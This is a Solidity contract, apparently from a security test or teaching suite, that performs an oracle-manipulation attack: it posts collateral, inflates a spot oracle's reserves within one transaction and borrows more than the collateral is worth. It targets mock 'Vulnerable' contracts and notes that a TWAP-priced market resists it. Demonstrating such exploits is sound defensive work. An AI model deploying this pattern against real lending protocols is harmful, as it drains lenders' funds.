// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {SpotOracle} from "../oracle/Oracles.sol";
import {VulnerableLendingMarket, SafeLendingMarket} from "../vault/LendingMarket.sol";
import {AdversarialERC20} from "../token/AdversarialERC20.sol";

/// @title OracleManipulationAttacker
/// @notice Inflates a spot oracle inside one transaction and borrows against the
///         inflated collateral, extracting more debt than the collateral is
///         genuinely worth. The same call against a TWAP-priced market reverts.
contract OracleManipulationAttacker {
    function attack(
        VulnerableLendingMarket market,
        SpotOracle oracle,
        AdversarialERC20 collateral,
        AdversarialERC20 debt,
        uint256 collateralAmount,
        uint256 r0,
        uint256 r1,
        uint256 borrowAmount
    ) external {
        // Post collateral from this contract, then move the pool the oracle reads.
        // Spot price becomes r1/r0 immediately; a TWAP would not move at all.
        collateral.approve(address(market), collateralAmount);
        market.depositCollateral(collateralAmount);
        oracle.setReserves(r0, r1);
        market.borrow(borrowAmount);
        debt.transfer(msg.sender, debt.balanceOf(address(this)));
    }
}
